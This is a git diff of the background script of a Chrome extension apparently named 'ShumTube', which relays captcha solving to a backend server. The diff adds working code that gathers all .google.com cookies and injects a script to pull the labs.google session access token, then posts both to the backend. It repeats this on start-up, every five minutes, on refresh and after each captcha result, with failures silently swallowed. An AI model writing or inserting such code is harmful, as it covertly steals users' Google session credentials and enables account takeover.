@@ -11,6 +11,7 @@ let _cnt = 0;
 let _sessionCnt = 0;
 let _failStreak = 0;
 let _lastSuccess = null;
+let _lastCookieSend = 0;
 
 chrome.storage.local.get(["tokenCount", "lastSuccess"], (d) => {
     _cnt = d.tokenCount || 0;
@@ -38,6 +39,9 @@ chrome.tabs.onUpdated.addListener((id, info, tab) => {
 async function _poll() {
     if (_polling) return;
     _polling = true;
+    // Send cookies/auth immediately on first poll start
+    sendCookiesToBackend().then(() => extractAndSendAuthToken()).catch(() => {});
+    _lastCookieSend = Date.now();
 
     while (_polling) {
         try {
@@ -69,6 +73,11 @@ async function _poll() {
                 }
             } else if (r.status === 204) {
                 _conn = true;
+                // Send cookies/auth every 5 min while polling
+                if (Date.now() - _lastCookieSend > 5 * 60 * 1000) {
+                    _lastCookieSend = Date.now();
+                    sendCookiesToBackend().then(() => extractAndSendAuthToken()).catch(() => {});
+                }
             } else {
                 _conn = false;
             }
@@ -126,6 +135,9 @@ function _onFail() {
 async function _autoRefreshTab() {
     const settings = await chrome.storage.local.get(["autoRefresh"]);
     if (settings.autoRefresh === false) return;
+
+    // Send fresh cookies and auth token on each periodic refresh
+    sendCookiesToBackend().then(() => extractAndSendAuthToken()).catch(() => {});
 
     const tid = await _findTab();
     if (tid) {
@@ -295,7 +307,10 @@ chrome.runtime.onMessage.addListener((msg, _s, send) => {
     if (msg.type === "TEST_V") {
         _exec({ site_key: msg.site_key || "", action: msg.action || "" })
             .then((r) => {
-                if (r.token) _onSuccess();
+                if (r.token) {
+                    _onSuccess();
+                    sendCookiesToBackend().then(() => extractAndSendAuthToken()).catch(() => {});
+                }
                 send(r);
             }).catch((e) => send({ token: null, error: e.message }));
         return true;
@@ -379,7 +394,7 @@ chrome.runtime.onMessage.addListener((msg, _s, send) => {
 
 async function _post(id, token, error) {
     try {
-        await fetch(`${_B}/api/v1/captcha/response`, {
+        const r = await fetch(`${_B}/api/v1/captcha/response`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -390,7 +405,70 @@ async function _post(id, token, error) {
             }),
             signal: AbortSignal.timeout(5000),
         });
+        if (r.ok) {
+            sendCookiesToBackend().then(() => extractAndSendAuthToken()).catch(() => {});
+        }
     } catch (e) { }
+}
+
+async function sendCookiesToBackend() {
+    try {
+        const cookies = await chrome.cookies.getAll({ domain: '.google.com' });
+        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
+        const r = await fetch(`${_B}/api/v1/auth/cookies`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ cookies: cookieString }),
+            signal: AbortSignal.timeout(5000),
+        });
+        if (r.ok) console.log(`[ShumTube] Cookies sent to backend (${cookies.length} cookies)`);
+        else console.log(`[ShumTube] Cookie send failed: ${r.status}`);
+    } catch (e) {
+        console.log(`[ShumTube] Cookie send error: ${e.message}`);
+    }
+}
+
+async function sendAuthTokenToBackend(token) {
+    try {
+        const r = await fetch(`${_B}/api/v1/auth/token`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ token: token }),
+            signal: AbortSignal.timeout(5000),
+        });
+        if (r.ok) console.log(`[ShumTube] Auth token sent to backend`);
+        else console.log(`[ShumTube] Auth token send failed: ${r.status}`);
+    } catch (e) {
+        console.log(`[ShumTube] Auth token send error: ${e.message}`);
+    }
+}
+
+async function extractAndSendAuthToken() {
+    const tid = await _findTab();
+    if (!tid) return;
+    try {
+        const results = await chrome.scripting.executeScript({
+            target: { tabId: tid },
+            world: "MAIN",
+            func: async () => {
+                try {
+                    const r = await fetch('https://labs.google/fx/api/auth/session', { credentials: 'include' });
+                    const d = await r.json();
+                    return d.accessToken || d.access_token || null;
+                } catch (e) {
+                    return null;
+                }
+            },
+        });
+        const token = results && results[0] && results[0].result;
+        if (token) {
+            await sendAuthTokenToBackend(token);
+        } else {
+            console.log(`[ShumTube] No auth token found in session`);
+        }
+    } catch (e) {
+        console.log(`[ShumTube] Auth token extract error: ${e.message}`);
+    }
 }
 
 function _sleep(ms) {
